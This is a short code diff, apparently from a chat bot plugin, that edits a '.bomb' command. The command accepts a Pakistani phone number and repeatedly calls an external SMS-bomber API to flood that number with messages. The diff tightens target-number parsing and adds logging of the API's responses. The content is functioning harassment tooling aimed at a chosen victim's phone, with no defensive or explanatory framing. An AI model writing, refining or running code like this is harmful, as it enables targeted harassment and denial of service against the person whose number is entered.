@@ -18,14 +18,13 @@ cmd({
         return reply("✅ Bombing stopped!");
     }
 
-    // Extract Number (support both .bomb and !bomb)
-    const prefix = text.startsWith('.') ? '.' : '!'; // Detect prefix
-    const args = text.slice(1).trim().split(' '); // Remove prefix
-    const number = args[0]?.replace(/[^0-9]/g, '');
+    // Extract Number (Remove ALL non-digits + trim spaces/newlines)
+    let number = text.replace(/[^\d]/g, '').trim(); // Pure number nikalne ka hardcore tareeka
+    number = number.match(/92\d{9}$/)?.[0]; // Match ONLY 92 followed by 9 digits
 
     // Validate Number
-    if (!number || !number.startsWith('92') || number.length !== 11) {
-        return reply(`❌ Invalid PK number! Usage: ${prefix}bomb 923001234567`);
+    if (!number) {
+        return reply("❌ Invalid PK number! Use: .bomb 923001234567");
     }
 
     // Start Bombing
@@ -44,7 +43,7 @@ cmd({
         try {
             const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
             const response = await fetch(apiUrl);
-            console.log("API Response:", response.status); // Debugging
+            console.log("API Response:", response.status, await response.text());
             
             if (!response.ok) throw new Error(`API Error: ${response.status}`);
             sent++;
